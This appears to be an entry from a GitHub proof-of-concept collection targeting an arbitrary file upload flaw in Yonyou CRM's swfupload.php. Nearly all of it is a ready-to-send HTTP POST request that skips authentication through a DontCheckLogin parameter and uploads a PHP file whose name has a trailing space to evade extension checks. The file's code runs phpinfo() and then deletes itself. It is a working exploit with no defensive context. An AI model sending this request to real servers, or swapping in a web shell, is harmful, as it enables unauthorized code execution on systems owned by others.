# yonyou_crm_swfupload_fileupload
from : https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8Bcrm-swfupload%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md 
2024.4.15 @2

```
POST /ajax/swfupload.php?DontCheckLogin=1&vname=file HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------269520967239406871642430066855
Content-Length: 355

-----------------------------269520967239406871642430066855
Content-Disposition: form-data; name="file"; filename="%s.php "
Content-Type: application/octet-stream

<?phpinfo();sleep(8);unlink(__FILE__);?>
-----------------------------269520967239406871642430066855
Content-Disposition: form-data; name="upload"

upload
-----------------------------269520967239406871642430066855--
```
